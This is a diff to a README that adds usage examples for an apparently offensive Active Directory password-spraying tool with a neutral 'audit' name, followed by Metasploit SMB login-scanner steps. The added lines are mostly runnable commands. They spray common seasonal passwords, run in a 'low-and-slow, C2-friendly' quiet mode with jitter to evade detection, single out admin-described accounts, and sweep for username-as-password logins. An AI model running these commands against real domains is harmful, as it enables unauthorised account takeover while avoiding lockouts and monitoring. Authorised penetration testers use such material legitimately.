@@ -35,3 +35,46 @@ This command will write the domain user list without disabled accounts or accoun
 ```PowerShell
 Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
 ```
+# DirectoryAuthAudit.ps1 
+
+```powershell
+# dot source code
+. .\DirectoryAuthAudit.ps1
+
+# single password, auto-built userlist (screens disabled + near-lockout):
+Invoke-DirectoryAuthAudit -Password 'Winter2026!' -Force -OutFile hits.txt
+
+# full manual control:
+Invoke-DirectoryAuthAudit -UserList users.txt -Domain corp.local -PasswordList passes.txt -OutFile hits.txt -Force
+
+# low-and-slow, C2-friendly (no console noise):
+Invoke-DirectoryAuthAudit -Password 'Summer2026!' -Delay 5 -Jitter 0.3 -Quiet -Force -OutFile hits.txt
+
+# targeted at admin-description accounts only:
+Invoke-DirectoryAuthAudit -Filter "(description=*admin*)" -Password 'x' -Force
+
+# username-as-password sweep:
+Invoke-DirectoryAuthAudit -UsernameAsPassword -OutFile valid.txt -Force -Quiet
+```
+
+# Using the SMB Login Metasploit Auxiliary Scanner
+
+```bash
+msfconsole
+use auxiliary/scanner/smb/smb_login
+show options
+```
+
+Set the required options:
+```bash
+# Single username/password
+set RHOSTS <TARGET>
+set SMBUser <USERNAME>
+set SMBPass <PASSWORD>
+
+# Or use wordlists
+set USER_FILE <USER_LIST>
+set PASS_FILE <PASSWORD_LIST>
+
+run
+```
